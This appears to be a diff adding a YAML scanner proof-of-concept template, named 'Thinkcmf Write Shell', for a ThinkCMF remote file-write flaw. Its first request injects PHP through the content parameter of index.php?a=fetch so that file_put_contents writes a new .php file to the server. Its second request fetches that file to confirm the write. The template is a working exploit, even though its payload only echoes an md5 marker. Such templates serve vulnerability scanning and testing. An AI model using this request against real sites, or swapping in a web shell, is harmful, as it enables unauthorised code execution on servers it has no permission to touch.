@@ -1,0 +1,33 @@
+id: poc-yaml-thinkcmf-write-shell
+info:
+  name: Thinkcmf Write Shell
+  severity: medium
+  tags:
+  - 两高一弱
+  - 文件写入
+  finger: Thinkcmf Write Shell
+  reference: []
+  description: null
+variables:
+  r: random_int(10000, 20000)
+  r1: md5(r)
+transport: http
+requests:
+- method: GET
+  path: /index.php?a=fetch&content=%3C?php+file_put_contents(%22{{.r}}.php%22,%22%3C?php+echo+md5({{.r}})%3B%22)%3B
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: 'true'
+  output: []
+- method: GET
+  path: /{{.r}}.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1)
+  output: []
